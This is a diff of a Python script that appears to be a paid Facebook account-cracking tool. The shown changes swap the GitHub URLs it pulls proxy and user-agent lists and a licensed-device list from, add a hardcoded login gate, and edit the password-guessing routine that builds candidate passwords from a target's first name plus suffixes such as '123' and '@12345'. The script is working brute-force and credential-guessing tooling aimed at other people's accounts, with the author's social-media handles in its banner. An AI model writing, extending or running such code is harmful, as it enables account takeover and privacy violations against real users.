@@ -14,8 +14,6 @@ from rich.text import Text as tekz
 from time import localtime as lt
 pretty.install()
 CON=sol()
-print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
-time.sleep(2)
 
  
 ugen2=[]
@@ -24,7 +22,7 @@ cokbrut=[]
 ses=requests.Session()
 prinCP=[]
 try:
-    prox= requests.get('https://github.com/FIGHTERXJOD/HITLER-X-GOD/blob/main/V4.txt').text
+    prox= requests.get('https://github.com/HITLERXGOD/HITLERXGOD/blob/main/v2.txt').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     pass
@@ -274,7 +272,7 @@ def uaku():
         for ub in ua:
             ugen.append(ub)
     except:
-        a=requests.get('https://github.com/FIGHTERXJOD/HITLER-X-GOD/blob/main/V4.txt').text
+        a=requests.get('https://github.com/HITLERXGOD/HITLERXGOD/blob/main/v2.txt').text
         ua=open('bbnew.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -358,7 +356,21 @@ else:
 def clear():
 	os.system('clear')
 #------------------[ MAIN ]-----------------#
-print("\033[1;37m [\u001b[36m•\033[1;37m] UPDATES DONE \033[1;37m")
+import time
+
+def typewriter(text, delay=9.0):
+  for letter in text:
+    print(letter, end='', flush=True)
+    time.sleep(delay)
+  print()
+    
+typewriter("""
+
+\033[37m         𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆••••••••••••••••••••""", 0.03)
+
+
+os.system('clear')
+pass
 #------------------[ MACHINE-SUPPORT ]---------------#
  
 def saureeeeyy(x):
@@ -385,10 +397,10 @@ logo ="""
                                                      
 \033[1;37;1m-----------------------------------------------
  AUTHOR     : HITLER X GOD
- GITHUB     : SURAJGODEXE
+ GITHUB     : FLIGHTERXGOD
  FACEBOOK   : SURAJ VHUSAL
  TOOLS     \033[1;97m : \x1b[97m\033[37;41m PAID\033[0;m
- VERSION    : \033[1;36m5.0 \033[1;37m
+ VERSION    : \033[1;36m5.01 \033[1;37m
 -----------------------------------------------"""   
 meyermarexudi =("""""")    
 alltimexudi =(""" \033[32;1m[-]""")
@@ -404,7 +416,7 @@ def meyexudi():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "K".join(uuid)
   try:
-    httpCaht = requests.get('https://github.com/FIGHTERXJOD/HITLER-X-GOD/blob/main/V4.txt').text
+    httpCaht = requests.get('https://github.com/FIGHTERXJOD/HITLER-X-GOD/blob/main/V5.txt').text
     if id in httpCaht:
       msg = str(os.geteuid())
       #time.sleep(0.5)
@@ -421,40 +433,29 @@ def meyexudi():
   except:
     sys.exit()
 meyexudi()
-#os.system("python runv2.py")
+#os.system("python runv5.py")
 def naima():
 	os.system('clear')
-import time
+print('   TO LOGIN ENTER USERNAME AND PASSWORD')	
+print('-----------------------------------------------')
+def back():
+	login()
+	
+	import getpass
 
-def typewriter(text, delay=0.9):
-  for letter in text:
-    print(letter, end='', flush=True)
-    time.sleep(delay)
-  print()
-    
-typewriter("""
+attemps = 0
 
-\033[31m         𝟭𝟬%
+while attemps < 12345677901:
+    username = input(' \033[1;37m [\u001b[36m•\033[1;37m] ENTER USERNAME: ')
+    password = input(' \033[1;37m [\u001b[36m•\033[1;37m] ENTER PASSWORD: ')
 
-\033[32m         𝟮𝟬%
-
-\033[33m         𝟯𝟬%
-
-\033[34m         𝟰𝟬%
-
-\033[35m         𝟱𝟬%
-
-\033[36m         𝟲𝟬%
-
-\033[37m         𝟳𝟬%
-
-\033[1;30m         𝟴𝟬%
-
-\033[1;34m         𝟵𝟬%
-
-\033[37m         𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆••••••••••••••••••••""", 0.03)
-
-
+    if username == 'SURAJ' and password == '1':
+        print(' ')
+        break
+    else:
+        print(' Incorrect Pass Please Trying ')
+        attemps += 1
+        continue
 os.system('clear')
 pass
  
@@ -478,7 +479,7 @@ def menu():
         crack_file()
     elif HEART in ['2','02']:
         os.system('xdg-open https://www.facebook.com/surajexegod')
-        os.system("python runv2.py")
+        os.system("python runv5.py")
     elif HEART in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
@@ -580,32 +581,24 @@ def passwrd():
                 if len(frs)<3:
                     pass
                 else:                
-                    pwv.append(frs+'12')
                     pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(nmf)
                     pwv.append(frs+'@123')
-                    pwv.append(frs+'@1234')
                     pwv.append(frs+'@12345')
                     pwv.append(frs+'@@@')
-                    pwv.append(frs+'@#')
                     pwv.append(frs+'123@')
                                                 
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
                 else:
-                    pwv.append(frs+'12')
                     pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(nmf)
                     pwv.append(frs+'@123')
-                    pwv.append(frs+'@1234')
                     pwv.append(frs+'@12345')
                     pwv.append(frs+'@@@')
-                    pwv.append(frs+'@#')
                     pwv.append(frs+'123@')
                                         
             if 'ya' in pwpluss:
